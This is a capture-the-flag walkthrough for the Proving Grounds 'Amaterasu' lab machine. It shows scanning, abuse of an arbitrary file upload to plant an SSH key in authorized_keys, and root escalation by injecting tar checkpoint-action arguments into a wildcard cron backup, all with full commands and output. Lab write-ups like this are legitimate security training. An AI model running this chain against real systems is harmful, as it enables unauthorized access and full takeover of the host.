---
layout: default
title: Amaterasu
parent: Proving Grounds Play
nav_order: 1
---

# Scanning

---

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/amaterasu]
└─$ sudo nmap -Pn -p- -sC -sV -T4 --open 192.168.160.249

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 192.168.45.217
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
25022/tcp open  ssh     OpenSSH 8.6 (protocol 2.0)
| ssh-hostkey:
|   256 68:c6:05:e8:dc:f2:9a:2a:78:9b:ee:a1:ae:f6:38:1a (ECDSA)
|_  256 e9:89:cc:c2:17:14:f3:bc:62:21:06:4a:5e:71:80:ce (ED25519)
33414/tcp open  unknown
Werkzeug/2.2.3 Python/3.9.13
40080/tcp open  http    Apache httpd 2.4.53 ((Fedora))
|_http-title: My test page
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.53 (Fedora)

```

# Enumeration

---

## 21 | FTP

Enters "passive mode" everytime I enter a command. Appears to be a deadend.

## 33414 | Werkzeug/2.2.3 Python/3.9.13

Running Gobuster we find _/help_ directory.

![help](../../../assets/images/ctfs/proving_grounds/amaterasu/help.png)

It appears we can use a CURL POST request to upload a file to _/file-upload_

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/amaterasu]
└─$ curl -L -i -X POST -H "Content-Type: multipart/form-data" -F file=@"test.txt" -F filename="test.txt" http://192.168.160.249:33414/file-upload
HTTP/1.1 201 CREATED
Server: Werkzeug/2.2.3 Python/3.9.13
Date: Sun, 12 Nov 2023 23:10:50 GMT
Content-Type: application/json
Content-Length: 41
Connection: close

{"message":"File successfully uploaded"}

```

Checking the Flask server we can see the file was uploaded.

![test](../../../assets/images/ctfs/proving_grounds/amaterasu/test.png)

We have LFI and now need to determine how best to exploit this.

# Exploitation

---

Checking the _/home_ directory we see there is a user directory _/alfredo_.

We can attempt to generate a new _id_rsa_ file to replace his existing RSA private key for SSH authentication.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/amaterasu]
└─$ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/vagrant/.ssh/id_rsa): /home/vagrant/Documents/PG/PLAY/amatera
su/id_alfredo
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /home/vagrant/Documents/PG/PLAY/amaterasu/id_alfredo
Your public key has been saved in /home/vagrant/Documents/PG/PLAY/amaterasu/id_alfredo.pub

```

Now upload to the _/home/aldredo_ directory.

We need to upload as a _.txt_ file and remove the file extension on the remote directory where it is being uploaded.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/amaterasu]
└─$ mv id_alfredo.pub id_alfredo.txt

┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/amaterasu]
└─$ curl -F filename="/home/alfredo/.ssh/authorized_keys" -F file=@id_alfredo.txt http://192.168.160.249:33414/file-upload
{"message":"File successfully uploaded"}


```

![authorized](../../../assets/images/ctfs/proving_grounds/amaterasu/authorized.png)

Now we can authenticate to the SSH service as _alfredo_

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/amaterasu]
└─$ ssh -p 25022 -i id_alfredo alfredo@192.168.160.249
Last failed login: Sun Nov 12 18:28:25 EST 2023 from 192.168.45.217 on ssh:notty
There were 3 failed login attempts since the last successful login.
Last login: Tue Mar 28 03:21:25 2023
[alfredo@fedora ~]$ id
uid=1000(alfredo) gid=1000(alfredo) groups=1000(alfredo)

```

# Post-Exploitation

---

## Check Cron Jobs

```bash
[alfredo@fedora ~]$ cat /etc/crontab
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root

# For details see man 4 crontabs

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed

*/1 * * * * root /usr/local/bin/backup-flask.sh

```

Check the _/usr/local/bin/backup-flask.sh_ job that is running every minute.

```bash
[alfredo@fedora ~]$ cat /usr/local/bin/backup-flask.sh
#!/bin/sh
export PATH="/home/alfredo/restapi:$PATH"
cd /home/alfredo/restapi
tar czf /tmp/flask.tar.gz *

```

This job is running _tar_ with the astrisk.

This allows for an exploitation technique known as _Bash Gobbling_

Let's create a malicious script that copies the _/home/alfredo/.ssh/authorized_keys_ to \*/root/.ssh/authorized_keys"

```bash
[alfredo@fedora ~]$ cd restapi
[alfredo@fedora restapi]$ echo '#!/bin/bash' >> getroot.sh
[alfredo@fedora restapi]$ echo 'cp /home/alfredo/.ssh/authorized_keys /root/.ssh/authorized_keys' >> getroot.sh
[alfredo@fedora restapi]$ cat getroot.sh#!/bin/bash
cp /home/alfredo/.ssh/authorized_keys /root/.ssh/authorized_keys
```

Now we can tamper with the backup process:

```bash
[alfredo@fedora restapi]$ touch ./--checkpoint=1 ./--checkpoint-action=exec=getroot.sh
```

Wait a few minutes for the cronjob to execute and then SSH into the system as the root user.

```bash
┌──(vagrant㉿kali)-[~/Documents/PG/PLAY/amaterasu]
└─$ ssh -p 25022 -i id_alfredo root@192.168.213.249
Web console: https://fedora:9090/

Last login: Tue Mar 28 03:21:22 2023
[root@fedora ~]# id
uid=0(root) gid=0(root) groups=0(root)

```
